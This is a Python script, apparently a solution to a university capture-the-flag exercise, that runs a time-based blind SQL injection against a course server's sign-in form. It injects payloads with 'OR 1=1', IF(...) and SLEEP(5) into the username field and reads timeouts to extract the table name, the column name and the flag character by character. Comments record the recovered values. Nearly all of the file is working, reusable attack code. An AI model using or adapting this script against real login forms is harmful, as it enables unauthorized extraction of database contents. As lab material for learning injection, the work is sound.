import requests
from requests.exceptions import Timeout

targetUrl = "http://shepherd.ii.uib.no:8002/signIn"

cont = 1
ascii_char = []
table_name = "" 
column_name = ""
flag = ""

#Make a character chain with a lot of ascii characters to check the names.

for i in range(48, 127):
     ascii_char += chr(i)

#Adding '$' symbol and put '_' in last place to ensure that it don't overwrite any character.
ascii_char.append('$')
ascii_char.remove('_')
ascii_char.append('_')


print (ascii_char)

#The first part will discover the name of the table using blind and time-based querys checking the characters of the chain and if there is a timeout it's because
#the query was correct and server is sleeping so that's I know if the letter checked is part of the name and I will add the letter to the name.
while cont < 5: 
     for i in ascii_char:
          param = {"inputName":"'OR 1=1 AND IF((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) LIKE '"
          +table_name+i+"%',SLEEP(5), 0)#", "inputPassword":"not_needed"}
          try:     
               result = requests.post(targetUrl, param, timeout=2)
          except Timeout:
               table_name += i
               print(table_name)
               cont = 0
               break
          cont+=1


print("\n\n\nThe table name is " + table_name + "\n\n\n")
#TBL_THE_FLAG_IS_HERE

cont = 1
#At the first place I tried with upper case but didn't work so it's necessary to have the name in lower case.
table_name = table_name.lower()

print("\n\n\nThe table name is " + table_name + "\n\n\n")
#The table name is tbl_the_flag_is_here


#The second part will discover the name of the first column in the table name using blind and time-based querys as well checking the characters of the chain 
# and if there is a timeout it's because the query was correct and server is sleeping so that's I know if the letter checked is part of the name 
#and I will add the letter to the name.

while cont < 5:  
     for i in ascii_char:
          param = {"inputName":"'OR 1=1 AND IF((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='"+ table_name +"' LIMIT 0,1) LIKE '"
          + column_name+i+"%',SLEEP(5), 0)#", "inputPassword":"not_needed"}
          try:     
               result = requests.post(targetUrl, param, timeout=3)
          except Timeout:
               column_name += i
               print(column_name)
               cont = 0
               break
          cont+=1

cont = 1
print("\n\n\nThe column name is " + column_name + "\n\n\n")
#The column name is FL4GF13LD


#The thir part will discover the content of the column in the table that I got previously using blind and time-based querys as well checking the characters 
#of the chain in the table name that and if there is a timeout it's because the query was correct and server is sleeping so that's I know if the letter checked is part of the name 
#and I will add the letter to the name.


while cont < 5:    
     for i in ascii_char:
          param = {"inputName":"'OR 1=1 AND IF((SELECT "+ column_name + " FROM "+ table_name +" LIMIT 1) LIKE '" + flag+i + "%',SLEEP(5), 0)#", "inputPassword":"not_needed"}
          
          try:     
               result = requests.post(targetUrl, param, timeout=4) 
          except Timeout:
               flag += i
               print(flag)
               cont = 0
               break
          cont+=1

print(flag)
#INF226{PR3TTY_70N6_P4$$W0RD_W17H_@_W31RD_CH4R537}